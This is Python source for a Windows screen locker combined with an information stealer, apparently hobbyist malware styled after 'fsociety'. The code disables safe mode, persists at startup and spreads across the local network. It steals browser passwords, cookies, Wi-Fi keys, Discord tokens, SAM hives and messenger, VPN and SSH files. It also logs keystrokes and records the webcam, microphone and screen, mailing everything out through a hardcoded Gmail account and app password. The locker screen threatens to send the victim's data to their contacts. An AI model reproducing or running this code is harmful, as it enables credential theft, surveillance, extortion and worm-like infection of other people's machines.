import ctypes, os, sys, time, threading, tempfile, tkinter as tk
from tkinter import PhotoImage
import shutil, winshell, base64, random, socket, subprocess, json
import urllib.request, urllib.parse, smtplib, email
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import cv2, numpy as np
from PIL import ImageGrab, Image, ImageDraw
import sqlite3, winreg, zipfile, win32crypt, re, glob as _glob, wave
from win32com.client import Dispatch

# ===== НАСТРОЙКИ =====
PASSWORD = "1601"
MAX_ATTEMPTS = 4
SKULL_BASE64 = "YOUR_BASE64_HERE"
GMAIL_LOGIN = "xzx78848@gmail.com"
GMAIL_APP_PASSWORD = "cbgr awth fvak xgfb"
RECEIVER_EMAIL = "xzx78848@gmail.com"
VIDEO_URL = "https://github.com/ippo123459-bit/winlocker/raw/refs/heads/main/fuxEcorp.mp4.mp4"
AUDIO_URL = "https://github.com/ippo123459-bit/winlocker/raw/refs/heads/main/fuxEcorp.mp4.mp3"
VIDEO_PATH = os.path.join(tempfile.gettempdir(), "fuxEcorp_video.mp4")
AUDIO_PATH = os.path.join(tempfile.gettempdir(), "fuxEcorp_audio.mp3")

attempts_left = MAX_ATTEMPTS
keylog_data = []
data_leak_progress = 0

# ===== СКРЫТИЕ =====
def hide_console():
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd: ctypes.windll.user32.ShowWindow(hwnd, 0)
    except: pass

# ===== WIN =====
def disable_win_key():
    try:
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "NoWinKeys", 0, winreg.REG_DWORD, 1); winreg.CloseKey(k)
    except: pass

def restore_win_key():
    try:
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "NoWinKeys", 0, winreg.REG_DWORD, 0); winreg.CloseKey(k)
    except: pass

def is_admin():
    try: return ctypes.windll.shell32.IsUserAnAdmin()
    except: return False

# ===== ANTI-VM =====
def is_vm():
    try:
        if ctypes.windll.kernel32.IsDebuggerPresent(): return True
        vm_signs = ["vbox", "vmware", "virtual", "qemu"]
        output = subprocess.check_output("systeminfo", shell=True, stderr=subprocess.DEVNULL).decode('cp866', errors='replace').lower()
        for sign in vm_signs:
            if sign in output: return True
    except: pass
    return False

# ===== БЛОКИРОВКА БЕЗОПАСНОГО РЕЖИМА =====
def block_safe_mode():
    try:
        if is_admin():
            os.system('bcdedit /deletevalue {current} safeboot >nul 2>&1')
            os.system('bcdedit /set {current} bootstatuspolicy ignoreallfailures >nul 2>&1')
            os.system('bcdedit /set {current} recoveryenabled no >nul 2>&1')
    except: pass

# ===== ЗАЩИТА ОТ ПЕРЕУСТАНОВКИ =====
def install_bootkit():
    try:
        if is_admin():
            cp = os.path.abspath(__file__)
            pythonw = sys.executable.replace("python.exe", "pythonw.exe")
            for key_path in [r"Software\Microsoft\Windows\CurrentVersion\Run",
                           r"Software\Microsoft\Windows\CurrentVersion\RunOnce"]:
                try:
                    k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_SET_VALUE)
                    winreg.SetValueEx(k, "WindowsService", 0, winreg.REG_SZ, f'"{pythonw}" "{cp}"')
                    winreg.CloseKey(k)
                except: pass
    except: pass

# ===== СКАНИРОВАНИЕ СЕТИ =====
def scan_network():
    devices = []
    try:
        arp = subprocess.check_output("arp -a", shell=True, stderr=subprocess.DEVNULL).decode('cp866', errors='replace')
        devices = re.findall(r'\d+\.\d+\.\d+\.\d+', arp)
    except: pass
    return list(set(devices))

# ===== ЗАРАЖЕНИЕ ДРУГИХ ПК =====
def infect_other_pcs():
    network_devices = scan_network()
    for ip in network_devices:
        try:
            os.system(f'net use \\\\{ip}\\C$ /user:admin admin >nul 2>&1')
            if os.path.exists(__file__):
                shutil.copy2(__file__, f'\\\\{ip}\\C$\\Windows\\Temp\\svchost.pyw')
            os.system(f'wmic /node:{ip} process call create "pythonw C:\\Windows\\Temp\\svchost.pyw" >nul 2>&1')
        except: pass

# ===== УПРАВЛЕНИЕ РОУТЕРОМ =====
def control_router(action="reboot"):
    routers = [("192.168.1.1", "admin", "admin"), ("192.168.0.1", "admin", "1234")]
    for ip, user, pwd in routers:
        try:
            if action == "reboot":
                urllib.request.urlopen(f"http://{ip}/reboot.cgi", timeout=3)
        except: pass

# ===== EMAIL =====
def send_email(msg, subj=None):
    try:
        m = MIMEText(msg, 'plain', 'utf-8')
        m['Subject'] = subj or 'DedSek'; m['From'] = GMAIL_LOGIN; m['To'] = RECEIVER_EMAIL
        s = smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=30)
        s.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD); s.send_message(m); s.quit()
    except: pass

def send_file_email(fp, desc):
    try:
        if not os.path.exists(fp): return
        m = MIMEMultipart()
        m['Subject'] = desc; m['From'] = GMAIL_LOGIN; m['To'] = RECEIVER_EMAIL
        with open(fp, 'rb') as f:
            p = MIMEBase('application', 'octet-stream'); p.set_payload(f.read())
            encoders.encode_base64(p)
            p.add_header('Content-Disposition', f'attachment; filename="{os.path.basename(fp)}"')
            m.attach(p)
        s = smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=60)
        s.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD); s.send_message(m); s.quit()
    except: pass

# ===== АВТОЗАГРУЗКА =====
def add_to_startup():
    try:
        cp = os.path.abspath(__file__)
        pp = os.path.splitext(cp)[0] + ".pyw"
        if not cp.endswith(".pyw"):
            try: shutil.copy2(cp, pp)
            except: pass
            cp = pp
        pythonw = sys.executable.replace("python.exe", "pythonw.exe")
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "DedSek", 0, winreg.REG_SZ, f'"{pythonw}" "{cp}"')
        winreg.CloseKey(k)
        startup = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        dest = os.path.join(startup, 'WindowsService.pyw')
        if cp != dest:
            try: shutil.copy2(cp, dest)
            except: pass
    except: pass

# ===== СКАЧИВАНИЕ =====
def download_video():
    try:
        if os.path.exists(VIDEO_PATH): os.remove(VIDEO_PATH)
        urllib.request.urlretrieve(VIDEO_URL, VIDEO_PATH)
    except: pass

def download_audio():
    try:
        if os.path.exists(AUDIO_PATH): os.remove(AUDIO_PATH)
        urllib.request.urlretrieve(AUDIO_URL, AUDIO_PATH)
    except: pass

# ===== ВИДЕО + ЗВУК =====
def play_video_fullscreen():
    try:
        video = tk.Tk()
        video.attributes('-fullscreen', True); video.attributes('-topmost', True)
        video.configure(bg='black'); video.overrideredirect(True)
        video.protocol("WM_DELETE_WINDOW", lambda: None); video.focus_force()
        try:
            import keyboard
            for k in ['alt+f4','alt+tab','ctrl+alt+del','ctrl+shift+esc','ctrl+esc','ctrl+w','win','win+d','win+r','win+e','win+l','win+m','win+tab','win+x','esc','space','enter']:
                keyboard.add_hotkey(k, lambda: None, suppress=True)
        except: ctypes.windll.user32.BlockInput(True)
        lbl = tk.Label(video, bg='black'); lbl.pack(expand=True, fill='both')
        audio_proc = None
        try:
            audio_proc = subprocess.Popen(['ffplay', '-nodisp', '-autoexit', '-loglevel', 'quiet', AUDIO_PATH], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except: pass
        cap = cv2.VideoCapture(VIDEO_PATH)
        if cap.isOpened():
            fps = cap.get(cv2.CAP_PROP_FPS)
            if fps <= 0 or fps > 60: fps = 30
            sw = video.winfo_screenwidth(); sh = video.winfo_screenheight()
            frame_time = 1.0 / fps; last_time = time.time()
            while cap.isOpened():
                ret, frame = cap.read()
                if not ret: break
                now = time.time()
                elapsed = now - last_time
                if elapsed < frame_time: time.sleep(frame_time - elapsed)
                last_time = time.time()
                frame = cv2.resize(frame, (sw, sh))
                frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                img = tk.PhotoImage(data=cv2.imencode('.ppm', frame_rgb)[1].tobytes())
                lbl.config(image=img); lbl.image = img; video.update()
            cap.release()
        if audio_proc:
            try: audio_proc.terminate()
            except: pass
        video.destroy()
        try: keyboard.unhook_all(); ctypes.windll.user32.BlockInput(False)
        except: pass
    except:
        try: ctypes.windll.user32.BlockInput(False)
        except: pass

# ===== АНИМАЦИЯ JESTER =====
def jester_animation():
    a = tk.Tk(); a.attributes('-fullscreen', True); a.attributes('-topmost', True)
    a.configure(bg='#1a3a5c'); a.overrideredirect(True); disable_win_key()
    frame = tk.Frame(a, bg='#1a3a5c'); frame.place(relx=0.5, rely=0.5, anchor='center')
    msgs = [("JESTER ACTIVATED", 24, '#ff4444'), ("Initializing encryption...", 14, 'white'),
            ("Scanning network...", 14, 'white'), ("Bypassing security...", 14, 'white'),
            ("SYSTEM COMPROMISED", 30, '#ff4444')]
    for text, size, color in msgs:
        lbl = tk.Label(frame, text=text, bg='#1a3a5c', fg=color, font=('Courier', size, 'bold'))
        lbl.pack(pady=10); a.update(); time.sleep(1.5); lbl.destroy()
    time.sleep(0.5); a.destroy()

# ===== РИСОВАНИЕ МАСКИ =====
def draw_jester():
    img = Image.new('RGBA', (180, 230), (0,0,0,0))
    d = ImageDraw.Draw(img)
    d.ellipse([25, 55, 155, 200], fill='#f5e6d3', outline='black', width=2)
    d.ellipse([55, 95, 80, 108], fill='black'); d.ellipse([100, 95, 125, 108], fill='black')
    d.arc([55, 120, 125, 175], start=0, end=180, fill='black', width=3)
    for x in range(65, 120, 8): d.line([x, 148, x, 160], fill='black', width=2)
    d.polygon([90, 8, 45, 62, 135, 62], fill='#8B0000', outline='black', width=2)
    d.ellipse([35, 3, 50, 18], fill='white', outline='black')
    d.ellipse([130, 3, 145, 18], fill='white', outline='black')
    d.ellipse([80, 0, 100, 12], fill='white', outline='black')
    return img

# ===== ИНДИКАТОР СЛИВА ДАННЫХ =====
def data_leak_indicator(parent):
    global data_leak_progress
    frame = tk.Frame(parent, bg='white')
    frame.pack(pady=5)
    tk.Label(frame, text="DATA LEAK:", bg='white', fg='#cc0000', font=('Courier', 9, 'bold')).pack(side='left', padx=5)
    bar = tk.Canvas(frame, width=150, height=12, bg='#eee', highlightthickness=0)
    bar.pack(side='left', padx=5)
    progress = bar.create_rectangle(0, 0, 0, 12, fill='#cc0000', outline='')
    def update_leak():
        global data_leak_progress
        while data_leak_progress < 100:
            data_leak_progress += random.randint(1, 5)
            if data_leak_progress > 100: data_leak_progress = 100
            bar.coords(progress, 0, 0, 150 * data_leak_progress / 100, 12)
            time.sleep(random.uniform(0.5, 2))
    threading.Thread(target=update_leak, daemon=True).start()

# ===== SSH/TELNET =====
def get_ssh_telnet_targets():
    targets = []
    try:
        public_ip = urllib.request.urlopen("https://api.ipify.org", timeout=5).read().decode()
        targets.append(("EXTERNAL", public_ip, "Подключение из интернета"))
    except: pass
    try:
        local_ip = socket.gethostbyname(socket.gethostname())
        targets.append(("LOCAL", local_ip, "Подключение из локальной сети"))
    except: pass
    try:
        route = subprocess.check_output("ipconfig | findstr /i \"шлюз\"", shell=True, stderr=subprocess.DEVNULL).decode('cp866', errors='replace')
        for line in route.split('\n'):
            if '.' in line and any(c.isdigit() for c in line):
                gw = re.findall(r'\d+\.\d+\.\d+\.\d+', line)
                if gw and not gw[0].startswith('0.'): targets.append(("GATEWAY", gw[0], "Роутер")); break
    except: pass
    try:
        arp = subprocess.check_output("arp -a", shell=True, stderr=subprocess.DEVNULL).decode('cp866', errors='replace')
        arp_ips = re.findall(r'\d+\.\d+\.\d+\.\d+', arp)
        for ip in list(set(arp_ips))[:10]:
            if ip not in [t[1] for t in targets] and not ip.endswith('.255') and not ip.endswith('.0'):
                targets.append(("NETWORK", ip, "Устройство в сети"))
    except: pass
    for i, (name, ip, desc) in enumerate(targets):
        for port in [22, 23]:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                if s.connect_ex((ip, port)) == 0:
                    service = "SSH" if port == 22 else "Telnet"
                    targets[i] = (name, ip, f"{desc} | {service} ОТКРЫТ!")
                s.close()
            except: pass
    return targets

# ===== РАСШИФРОВКА =====
def _decrypt_aes_gcm(data, key):
    try:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        return AESGCM(key).decrypt(data[:12], data[12:], None)
    except: return None

def _get_master_key(lp):
    ls = os.path.join(os.path.dirname(os.path.dirname(lp)), 'Local State')
    if os.path.exists(ls):
        try:
            kb = json.load(open(ls, 'r', encoding='utf-8'))['os_crypt']['encrypted_key']
            return win32crypt.CryptUnprotectData(base64.b64decode(kb)[5:], None, None, None, 0)[1]
        except: pass
    return None

def steal_chromium_passwords(browser, paths):
    res = []
    for lp in paths:
        if not os.path.exists(lp): continue
        try:
            mk = _get_master_key(lp)
            db = os.path.join(tempfile.gettempdir(), f'{browser}_{random.randint(0,9999)}.db')
            shutil.copy2(lp, db)
            cur = sqlite3.connect(db).cursor()
            cur.execute("SELECT origin_url, username_value, password_value FROM logins")
            for url, user, pw in cur:
                try:
                    if pw[:3] == b'\x76\x31\x31' and mk:
                        pwd = _decrypt_aes_gcm(pw[3:], mk)
                        pwd = pwd.decode('utf-8','ignore') if pwd else "***"
                    else:
                        pwd = win32crypt.CryptUnprotectData(pw, None, None, None, 0)[1].decode('utf-8','ignore')
                    res.append(f"URL: {url}\nLOGIN: {user}\nPASSWORD: {pwd}\n" + "-"*40)
                except: res.append(f"URL: {url}\nLOGIN: {user}\nPASSWORD: ***\n" + "-"*40)
            cur.close()
            try: os.remove(db)
            except: pass
        except: pass
    return res

def _parse_asn1(data):
    try:
        if data[0] != 0x30: return None, None
        off = 2 + (data[1] & 0x7F) if data[1] & 0x80 else 2
        iv = ct = None
        while off < len(data):
            tag, l = data[off], data[off+1]
            val = data[off+2:off+2+l]
            if tag == 0x04:
                if iv is None: iv = val
                else: ct = val
            off += 2 + l
        return iv, ct
    except: return None, None

def _decrypt_3des(data, key, iv):
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.backends import default_backend
        dec = Cipher(algorithms.TripleDES(key), modes.CBC(iv), default_backend()).decryptor()
        r = dec.update(data) + dec.finalize()
        return r[:-r[-1]] if r[-1] < 16 else r
    except: return None

def steal_firefox_passwords():
    res = []
    base = os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', 'Profiles')
    if not os.path.exists(base): return res
    for folder in os.listdir(base):
        pf = os.path.join(base, folder)
        lf = os.path.join(pf, 'logins.json'); kf = os.path.join(pf, 'key4.db')
        if not os.path.exists(lf) or not os.path.exists(kf): continue
        try:
            logins = json.load(open(lf, 'r', encoding='utf-8'))
            cur = sqlite3.connect(kf).cursor()
            cur.execute("SELECT a11, a102 FROM nssPrivate LIMIT 1")
            row = cur.fetchone()
            if not row or not row[1] or len(row[1]) < 24: continue
            key = row[1][:24]
            for login in logins.get('logins', []):
                host = login.get('hostname', ''); user = pwd = "ERROR"
                try:
                    iv, ct = _parse_asn1(base64.b64decode(login['encryptedUsername']))
                    if iv and ct:
                        d = _decrypt_3des(ct, key, iv)
                        if d: user = d.decode('utf-8','ignore').lstrip('\x00').strip()
                except: pass
                try:
                    iv, ct = _parse_asn1(base64.b64decode(login['encryptedPassword']))
                    if iv and ct:
                        d = _decrypt_3des(ct, key, iv)
                        if d: pwd = d.decode('utf-8','ignore').lstrip('\x00').strip()
                except: pass
                res.append(f"URL: {host}\nLOGIN: {user}\nPASSWORD: {pwd}\n" + "-"*40)
            cur.close()
        except: pass
    return res

def steal_wifi_passwords():
    r = []
    try:
        for line in subprocess.check_output("netsh wlan show profiles", shell=True, stderr=subprocess.DEVNULL).decode('cp866','replace').split('\n'):
            if 'Все профили' in line:
                p = line.split(':')[1].strip()
                if p:
                    det = subprocess.check_output(f'netsh wlan show profile name="{p}" key=clear', shell=True, stderr=subprocess.DEVNULL).decode('cp866','replace')
                    key = "НЕТ"
                    for dl in det.split('\n'):
                        if 'Содержимое ключа' in dl: key = dl.split(':')[1].strip()
                    r.append(f"WiFi: {p} | Пароль: {key}")
    except: pass
    return r

def steal_cookies_all():
    r = []
    cookie_paths = []
    chrome_base = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data')
    if os.path.exists(chrome_base):
        for folder in os.listdir(chrome_base):
            if folder == 'Default' or folder.startswith('Profile'):
                for f in ['Cookies', 'Network/Cookies']:
                    cp = os.path.join(chrome_base, folder, f)
                    if os.path.exists(cp): cookie_paths.append(('CHROME', cp))
    edge_base = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data')
    if os.path.exists(edge_base):
        for folder in os.listdir(edge_base):
            if folder == 'Default' or folder.startswith('Profile'):
                cp = os.path.join(edge_base, folder, 'Cookies')
                if os.path.exists(cp): cookie_paths.append(('EDGE', cp))
    yandex_base = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Yandex', 'YandexBrowser', 'User Data')
    if os.path.exists(yandex_base):
        for folder in os.listdir(yandex_base):
            if folder == 'Default' or folder.startswith('Profile'):
                cp = os.path.join(yandex_base, folder, 'Cookies')
                if os.path.exists(cp): cookie_paths.append(('YANDEX', cp))
    opera_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming', 'Opera Software', 'Opera Stable', 'Cookies')
    if os.path.exists(opera_path): cookie_paths.append(('OPERA', opera_path))
    ff_base = os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', 'Profiles')
    if os.path.exists(ff_base):
        for folder in os.listdir(ff_base):
            ff_cookie = os.path.join(ff_base, folder, 'cookies.sqlite')
            if os.path.exists(ff_cookie): cookie_paths.append(('FIREFOX', ff_cookie))
    for browser, cp in cookie_paths:
        try:
            db = os.path.join(tempfile.gettempdir(), f'cookie_{browser}_{random.randint(0,9999)}.db')
            shutil.copy2(cp, db)
            conn = sqlite3.connect(db)
            cur = conn.cursor()
            try:
                cur.execute("SELECT host_key, name, encrypted_value FROM cookies")
                for host, name, enc in cur.fetchall():
                    try:
                        val = win32crypt.CryptUnprotectData(enc, None, None, None, 0)[1].decode('utf-8','ignore')
                        r.append(f"{browser} | {host} | {name} | {val[:100]}")
                    except:
                        r.append(f"{browser} | {host} | {name} | [encrypted]")
            except:
                try:
                    cur.execute("SELECT host, name, value FROM moz_cookies")
                    for host, name, val in cur.fetchall():
                        r.append(f"{browser} | {host} | {name} | {val[:100]}")
                except: pass
            conn.close()
            try: os.remove(db)
            except: pass
        except: pass
    return r[:500] if r else ["Cookies not found"]

def steal_discord():
    tokens = set()
    for db in [os.path.join(os.environ['APPDATA'], 'discord', 'Local Storage', 'leveldb'), 
               os.path.join(os.environ['APPDATA'], 'discordcanary', 'Local Storage', 'leveldb')]:
        if not os.path.exists(db): continue
        for f in os.listdir(db):
            if f.endswith('.ldb') or f.endswith('.log'):
                try: tokens.update(re.findall(r'[MN][A-Za-z\d]{23}\.[A-Za-z\d]{6}\.[A-Za-z\d]{27}', open(os.path.join(db, f), 'r', errors='ignore').read()))
                except: pass
    return list(tokens)[:20]

def dump_sam():
    if not is_admin(): return "No admin"
    try:
        sp = os.path.join(tempfile.gettempdir(), 'sam'); syp = os.path.join(tempfile.gettempdir(), 'system')
        os.system(f'reg save HKLM\\SAM "{sp}" /y >nul 2>&1')
        os.system(f'reg save HKLM\\SYSTEM "{syp}" /y >nul 2>&1')
        if os.path.exists(sp) and os.path.getsize(sp) > 100:
            z = os.path.join(tempfile.gettempdir(), 'sam.zip')
            with zipfile.ZipFile(z, 'w') as zf: zf.write(sp, 'sam'); zf.write(syp, 'system')
            send_file_email(z, "[DedSek_Logs] SAM+SYSTEM")
            try: os.remove(z); os.remove(sp); os.remove(syp)
            except: pass
            return "SAM dumped!"
    except: pass
    return "Failed"

def capture_webcam():
    try:
        cam = cv2.VideoCapture(0)
        if cam.isOpened():
            ret, frame = cam.read()
            if ret:
                fp = os.path.join(tempfile.gettempdir(), f'cam_{int(time.time())}.jpg')
                cv2.imwrite(fp, frame)
                send_file_email(fp, "[DedSek_Logs] Webcam")
                try: os.remove(fp)
                except: pass
        cam.release()
    except: pass

def record_mic():
    try:
        import pyaudio
        CHUNK, FORMAT, CHANNELS, RATE, SEC = 1024, pyaudio.paInt16, 1, 44100, 30
        p = pyaudio.PyAudio()
        stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
        frames = []
        for _ in range(0, int(RATE/CHUNK*SEC)):
            try: frames.append(stream.read(CHUNK, exception_on_overflow=False))
            except: break
        stream.stop_stream(); stream.close(); p.terminate()
        fp = os.path.join(tempfile.gettempdir(), f'mic_{int(time.time())}.wav')
        wf = wave.open(fp, 'wb')
        wf.setnchannels(CHANNELS); wf.setsampwidth(p.get_sample_size(FORMAT)); wf.setframerate(RATE)
        wf.writeframes(b''.join(frames)); wf.close()
        send_file_email(fp, "[DedSek_Logs] Mic")
        try: os.remove(fp)
        except: pass
    except: pass

def keylogger_thread():
    try:
        import keyboard
        def on_key(e):
            global keylog_data
            keylog_data.append(f"{time.strftime('%H:%M:%S')} | {e.name}")
            if len(keylog_data) >= 100:
                send_email('\n'.join(keylog_data), "[DedSek_Logs] Keylogger")
                keylog_data.clear()
        keyboard.on_press(on_key)
    except: pass

def steal_telegram():
    tg = os.path.join(os.environ['APPDATA'], 'Telegram Desktop', 'tdata')
    if not os.path.exists(tg): return
    try:
        z = os.path.join(tempfile.gettempdir(), 'telegram.zip')
        with zipfile.ZipFile(z, 'w', zipfile.ZIP_DEFLATED) as zf:
            for r, d, files in os.walk(tg):
                for f in files:
                    if not f.endswith('.exe') and not f.endswith('.dll'):
                        zf.write(os.path.join(r, f), os.path.relpath(os.path.join(r, f), tg))
        send_file_email(z, "[DedSek_Logs] Telegram")
        try: os.remove(z)
        except: pass
    except: pass

def steal_steam():
    steam = os.path.join(os.environ.get('PROGRAMFILES(X86)', 'C:\\Program Files (x86)'), 'Steam')
    if os.path.exists(steam):
        for f in ['config/loginusers.vdf', 'config/config.vdf']:
            fp = os.path.join(steam, f)
            if os.path.exists(fp): send_file_email(fp, f"[DedSek_Logs] Steam {os.path.basename(fp)}")

def steal_vpn_configs():
    for path in [
        os.path.join(os.environ['USERPROFILE'], 'OpenVPN', 'config'),
        os.path.join(os.environ['PROGRAMFILES'], 'OpenVPN', 'config'),
        os.path.join(os.environ['PROGRAMFILES'], 'WireGuard', 'Data'),
    ]:
        if os.path.exists(path):
            for f in os.listdir(path):
                fp = os.path.join(path, f)
                if f.endswith('.ovpn') or f.endswith('.conf') or f.endswith('.key'):
                    send_file_email(fp, f"[DedSek_Logs] VPN {f}")

def steal_configs():
    configs = {
        "SSH": os.path.join(os.environ['USERPROFILE'], '.ssh', 'id_rsa'),
        "RDP": os.path.join(os.environ['USERPROFILE'], 'Documents', 'Default.rdp'),
        "FileZilla": os.path.join(os.environ['APPDATA'], 'FileZilla', 'sitemanager.xml'),
    }
    for name, path in configs.items():
        if os.path.exists(path) and os.path.getsize(path) < 5*1024*1024:
            send_file_email(path, f"[DedSek_Logs] Config {name}")

def steal_clipboard():
    try:
        import win32clipboard
        win32clipboard.OpenClipboard()
        if win32clipboard.IsClipboardFormatAvailable(1):
            data = win32clipboard.GetClipboardData()
            if data: send_email(f"CLIPBOARD:\n{str(data)[:2000]}", "[DedSek_Logs] Clipboard")
        win32clipboard.CloseClipboard()
    except: pass

# ===== МЕГА-СТИЛЕР =====
def mega_steal():
    targets = get_ssh_telnet_targets()
    report = ["="*60, "DEDSEK ULTIMATE STEALER", "="*60]
    report.append(f"\nUSER: {os.environ.get('USERNAME')} | PC: {socket.gethostname()}")
    report.append("\n" + "="*60)
    report.append("SSH/TELNET TARGETS")
    report.append("="*60)
    for name, ip, desc in targets: report.append(f"{name}: {ip} - {desc}")
    report.append("\n" + "="*60)
    report.append("ПАРОЛИ БРАУЗЕРОВ")
    report.append("="*60)
    for name, paths in {
        "CHROME": [os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')],
        "EDGE": [os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data')],
        "YANDEX": [os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Yandex', 'YandexBrowser', 'User Data', 'Default', 'Login Data')],
        "OPERA": [os.path.join(os.environ['APPDATA'], 'Opera Software', 'Opera Stable', 'Login Data')],
    }.items():
        data = steal_chromium_passwords(name, paths)
        report.append(f"\n--- {name} ---")
        report.extend(data if data else ["Нет данных"])
    report.append("\n--- FIREFOX ---")
    report.extend(steal_firefox_passwords() or ["Нет данных"])
    report.append("\n" + "="*60)
    report.append("WIFI ПАРОЛИ")
    report.append("="*60)
    report.extend(steal_wifi_passwords() or ["Нет данных"])
    cookies = steal_cookies_all()
    if cookies and cookies != ["Cookies not found"]:
        report.append("\n" + "="*60)
        report.append("COOKIES")
        report.append("="*60)
        report.extend(cookies)
    report.append("\n" + "="*60)
    report.append("DISCORD TOKENS")
    report.append("="*60)
    tokens = steal_discord()
    report.extend([f"TOKEN: {t}" for t in tokens] if tokens else ["Нет токенов"])
    report.append("\n" + "="*60)
    report.append("WINDOWS PASSWORD (SAM)")
    report.append("="*60)
    report.append(dump_sam())
    report.append("\n" + "="*60)
    report.append(f"ОТЧЁТ: {time.strftime('%d.%m.%Y %H:%M:%S')}")
    text = '\n'.join(report)
    for i, part in enumerate([text[i:i+15000] for i in range(0, len(text), 15000)]):
        send_email(part, f"[DedSek_Logs] Full Report [{i+1}]")
    for t in [steal_telegram, steal_steam, steal_vpn_configs, steal_configs, steal_clipboard, capture_webcam, record_mic]:
        threading.Thread(target=t, daemon=True).start()
    try:
        ss = os.path.join(tempfile.gettempdir(), 'desktop.jpg')
        ImageGrab.grab().save(ss, 'JPEG', quality=50)
        send_file_email(ss, "[DedSek_Logs] Screenshot")
        try: os.remove(ss)
        except: pass
    except: pass

# ===== ЗАПИСЬ ЭКРАНА =====
def record_loop():
    while True:
        try:
            vp = os.path.join(tempfile.gettempdir(), f"v_{int(time.time())}.avi")
            out = cv2.VideoWriter(vp, cv2.VideoWriter_fourcc(*'XVID'), 10.0, (1280, 720))
            for _ in range(150):
                out.write(cv2.resize(cv2.cvtColor(np.array(ImageGrab.grab()), cv2.COLOR_BGR2RGB), (1280, 720)))
                time.sleep(0.1)
            out.release()
            if os.path.getsize(vp) > 20*1024*1024:
                try:
                    out2 = vp.replace('.avi', '.mp4')
                    subprocess.run(['ffmpeg', '-i', vp, '-c:v', 'libx264', '-preset', 'ultrafast', '-crf', '35', '-b:v', '200k', '-s', '640x360', '-r', '10', '-y', out2], capture_output=True, timeout=30)
                    vp = out2
                except: pass
            send_file_email(vp, "[DedSek_Logs] Video")
            try: os.remove(vp)
            except: pass
        except: time.sleep(1)

# ===== ВИНЛОКЕР =====
def block_keys():
    try:
        import keyboard
        for c in ['alt+f4','alt+tab','alt+esc','alt+space','ctrl+shift+esc','ctrl+alt+del','ctrl+esc','ctrl+w','ctrl+f4','ctrl+tab','win','win+d','win+r','win+e','win+l','win+m','win+tab','win+x','win+u','alt','ctrl','shift','f11','print screen','alt+print screen','left windows','right windows']:
            try: keyboard.add_hotkey(c, lambda: None, suppress=True, timeout=0)
            except: pass
    except: pass

def unblock():
    try: ctypes.windll.user32.BlockInput(False)
    except: pass
    try: import keyboard; keyboard.unhook_all()
    except: pass

def kill_procs():
    kl = ["taskmgr.exe","cmd.exe","powershell.exe","msconfig.exe","regedit.exe"]
    while True:
        for p in kl: os.system(f"taskkill /f /im {p} >nul 2>&1")
        time.sleep(0.05)

def reset_windows():
    try:
        restore_win_key(); unblock()
        es = tk.Tk()
        es.attributes('-fullscreen', True); es.attributes('-topmost', True)
        es.configure(bg='black'); es.overrideredirect(True)
        tk.Label(es, text="404 | ERROR", bg='black', fg='white', font=('Courier',40,'bold')).pack(expand=True)
        tk.Label(es, text="ALL DATA DESTROYED...", bg='black', fg='white', font=('Courier',20)).pack()
        es.update(); time.sleep(5); es.destroy()
        os.system("shutdown /r /t 0 /f"); os._exit(0)
    except:
        os.system("shutdown /r /t 0 /f"); os._exit(0)

class WinLocker:
    def __init__(self):
        self.root = tk.Tk(); self.root.withdraw()
        self.win = tk.Toplevel(self.root)
        self.win.attributes('-fullscreen', True); self.win.attributes('-topmost', True)
        self.win.configure(bg='#1a3a5c'); self.win.overrideredirect(True)
        self.win.protocol("WM_DELETE_WINDOW", lambda: None); self.win.focus_force()
        global attempts_left
        
        # Верхний белый блок
        top = tk.Frame(self.win, bg='white', bd=2, relief='solid')
        top.place(relx=0.5, rely=0.02, anchor='n', width=780, height=260)
        tk.Label(top, text="#OPdailyallowance", bg='white', fg='#111', font=('Courier', 16, 'bold')).pack(pady=(10,2))
        tk.Label(top, text="Your files are encrypted.", bg='white', fg='#cc0000', font=('Courier', 12, 'bold')).pack(pady=2)
        tk.Label(top, text="To unlock you need to solve the riddle.", bg='white', fg='#111', font=('Courier', 10)).pack(pady=3)
        tk.Label(top, text="If timer expires - your browser history and personal\nmessages will be sent to ALL your contacts.", bg='white', fg='#cc0000', font=('Courier', 10, 'bold')).pack(pady=3)
        tk.Label(top, text="More instructions forthcoming - fsociety", bg='white', fg='#666', font=('Courier', 9, 'italic')).pack(pady=2)
